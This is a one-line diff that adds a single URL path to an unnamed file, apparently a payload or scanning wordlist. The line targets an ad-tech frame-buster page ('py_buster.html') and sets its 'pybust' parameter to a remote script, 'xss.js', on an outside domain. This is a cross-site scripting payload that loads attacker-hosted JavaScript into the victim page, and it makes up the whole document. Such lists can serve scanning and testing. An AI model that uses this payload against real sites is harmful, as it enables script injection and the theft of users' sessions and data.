@@ -1,0 +1,1 @@
+/ipinyou/py_buster.html?pybust=https://bgtian.life/xss.js
